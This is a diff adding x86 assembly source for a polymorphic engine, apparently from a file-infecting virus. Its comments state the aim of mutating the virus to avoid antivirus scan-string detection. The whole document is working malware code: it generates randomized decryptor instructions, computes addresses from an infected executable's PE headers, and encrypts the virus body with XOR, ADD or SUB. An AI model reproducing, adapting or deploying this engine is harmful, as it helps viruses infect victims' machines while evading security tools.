@@ -1,0 +1,274 @@
+;%%%6 0 POLY Simple polymorphic engine
+
+;###GetTickCount
+
+;thats a simple polymorphic engine. altought not advanced, it can mutate the
+;virus enought to avoid detection by scanstrings
+
+encrypt:
+        pushad
+
+;first of all, put NOPs in the place of encryption instruction in encryption
+;loop. later, we will put there the inverse of the instruction used in the
+;poly decryptor
+
+        call delta
+        mov wo [ebp+ofs @@crypt_instr],9090h
+
+;now we choose a register to be our counter, by getting a number between 0..7
+;(EAX..EDI). all registers except ESP can be used.
+
+  @@no_esp:
+        call [ebp+_GetTickCount]
+        and eax,111b
+        cmp al, 4
+        je @@no_esp
+        push eax
+
+;generate a MOV REG,-VIRUSSIZE (coz we will increase it till 0).
+
+        push eax
+        mov eax,[esp.Pushad_ecx+4*2]
+        not eax
+        push eax
+        call build_move
+
+;now, choose other register to be the pointer
+
+  @@choose_pointer:
+        call [ebp+_GetTickCount]
+        and eax,111b
+
+;verify that new register is ESP, EBP nor the same in use for counter
+
+	cmp al,4
+	je @@choose_pointer
+
+	cmp al,5
+	je @@choose_pointer
+
+        cmp [esp],eax
+        je @@choose_pointer
+        push eax
+
+;calculate the start of virus in infected file, and generate a MOV REG, RVA
+;now, it point to the start of our infected code(that will be the generated
+;poly decryptor). later, we will fix it to point to start of crypted stuff.
+
+        push eax
+        mov eax,[esp.Pushad_ebp+4*3]
+        add eax,[eax.MZ_lfanew]
+        mov eax,[eax.NT_OptionalHeader.OH_ImageBase]
+        add eax,[esp.Pushad_eax+4*3]
+        push eax
+        call build_move
+
+;save the start of the decryption loop (we will need it for the loop build)
+
+        lea ebx,[edi-4]
+
+;now is time to choose the decryption/encryption. the decryption instruction
+;will go to the poly decryptor, in infected file, while the encryption one
+;will be places in out NOPs buffer
+
+  @@repeat:
+        call [ebp+_GetTickCount]
+        and eax,11b
+        cmp al,11b
+        je @@repeat
+        mov eax,[ebp+ofs crypt_table+(eax*4)]
+
+;build encryption instruction
+
+	mov edx,[esp]
+        or ah,dl
+        stosw
+        shr eax,16
+        mov by [ebp+@@crypt_instr],al
+
+;set encryption value
+
+        call [ebp+_GetTickCount]
+        stosb
+        mov by [ebp+@@crypt_instr+1],al
+
+;generate instruction to increase the pointer register in poly decryptor
+
+        call increase_reg
+
+;generate instruction to increase the counter register in poly decryptor
+
+        call increase_reg
+
+;now, generate a JZ DONE/JMP DECRYPT_LOOP (remember our counter start in
+;(-VIRUSSIZE and grow till 0)
+
+        sub ebx,edi
+        mov eax,0eb027400h
+        mov al,bl
+        ror eax,8
+        stosd
+
+;by last, we patch the 2nd instruction generated (the MOV REG, RVA), to it
+;point to right place
+
+        mov ecx,[esp.Pushad_edi]
+        mov eax,edi
+        sub eax,ecx
+        add [esi],eax
+
+;now, our poly decyptor is done. so, its time to encrypt the virus code
+
+        mov ecx,[esp.Pushad_ecx]
+        mov esi,[esp.Pushad_esi]
+  @@crypt_loop:
+        lodsb
+
+;these NOP will hold the encryption instruction used. it is used to encrypt
+;the virus code, in match with the poly decryptor generated
+
+  @@crypt_instr:
+        db 90h,90h
+
+        stosb
+        loop @@crypt_loop
+
+        mov [esp.Pushad_eax],ecx
+        popad
+        ret
+
+
+
+;this routine generate instructions to increase the value of a register(Arg1)
+;so far, it produce INC REG, ADD 1 or SUB -1
+
+increase_reg:
+        pushad
+
+        mov ebx,[esp.cPushad.Arg1]
+
+;choose what instruction we will generate
+
+        call [ebp+_GetTickCount]
+        bt eax,1
+        jc @@generate_inc
+
+  @@generate_add:
+        mov edx,05c081h
+        mov ecx,1
+        bt eax,2
+        jc @@generate_op
+
+  @@generate_sub:
+        mov edx,2de881h
+        mov ecx,-1
+
+;now that all is set to generate either the ADD 1 or the SUB -1, do it. but,
+;first of all, we need check if the register we should increment is EAX. for
+;EAX, there are optimized opcodes (and then the other looks suspicious)
+
+  @@generate_op:
+        mov eax,edx
+        test ebx,ebx
+        jnz @@nouse_eax
+
+;setup for use of optimized form
+
+        shr eax,16
+        or al,bl
+        stosb
+        jmp @@putincrement
+
+;generate the ADD 1/SUB -1
+
+  @@nouse_eax:
+        or ah,bl
+        stosw
+  @@putincrement:
+        mov eax,ecx
+        stosd
+        jmp @@done
+
+;generate the INC REG, by ORing the register number(Arg1) with the opcode value
+;for INC opcode(40h)
+
+  @@generate_inc:
+        mov al,bl
+        or al,40h
+        stosb
+
+  @@done:
+        mov [esp.Pushad_edi],edi
+        popad
+        ret 4
+
+
+
+;this routine generate the instruction to move a fixed value(Arg2) to a
+;register(Arg2). so far, it produce PUSH ?/POP, MOV ? and LEA,[?]
+
+build_move:
+        pushad
+
+        mov ebx,[esp.cPushad.Arg2]
+        mov esi,[esp.cPushad.Arg1]
+
+;choose what instruction we will generate
+
+        call [ebp+_GetTickCount]
+        bt eax,1
+        jc @@generate_mov
+        bt eax,2
+        jc @@generate_lea
+
+;generate PUSH VALUE follow of POP REG
+
+  @@push_pop:
+        mov al,68h
+        stosb
+        mov eax,esi
+        mov [esp.Pushad_esi],edi
+        stosd
+        mov al,58h
+        or al,bl
+        stosb
+        jmp @@done
+
+;generate LEA REG,[VALUE]
+
+  @@generate_lea:
+        mov eax,058Dh
+        shl ebx,3
+        or ah,bl
+        stosw
+        jmp @@imm
+
+;generate MOV REG,VALUE
+
+  @@generate_mov:
+        mov al,0b8h
+        or al,bl
+        stosb
+  @@imm:
+        mov [esp.Pushad_esi],edi
+        mov eax,esi
+        stosd
+
+  @@done:
+        mov [esp.Pushad_edi],edi
+        popad
+        ret 4*2
+
+
+
+crypt_table dd 343080h          ;xor/xor
+            dd 2c0080h          ;add/sub
+            dd 042880h          ;sub/add
+
+
+;return the virus size+poly loop
+
+get_virus_size:
+	mov eax, virus_size+32
+	ret
+
